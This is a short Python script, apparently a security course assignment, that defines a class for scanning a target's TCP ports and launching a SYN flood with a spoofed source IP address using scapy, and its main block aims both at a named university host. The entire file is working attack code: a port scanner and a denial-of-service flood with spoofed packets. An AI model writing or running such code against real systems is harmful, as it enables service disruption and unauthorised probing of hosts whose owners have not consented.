import socket
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP: str, targetIP: str) -> None:
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart: int, rangeEnd: int) -> None:
        open_ports = []
        for port in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.targetIP, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        with open('openports.txt', 'w') as file:
            for port in open_ports:
                file.write(f"{port}\n")

    def attackTarget(self, port: int, numSyn: int) -> int:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        ip = IP(src=self.spoofIP, dst=self.targetIP)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X" * 1024)
        packet = ip / tcp / raw
        for _ in range(numSyn):
            send(packet, verbose=0)
        return 1

if __name__ == "__main__":
    # Construct an instance of the TcpAttack class and perform scanning and SYN Flood Attack
    spoofIP = '10.10.10.10'
    targetIP = 'moonshine.ecn.purdue.edu'
    rangeStart = 1000
    rangeEnd = 4000
    port = 1716
    numSyn = 100

    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)
    
    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open and flooded with {numSyn} SYN packets")
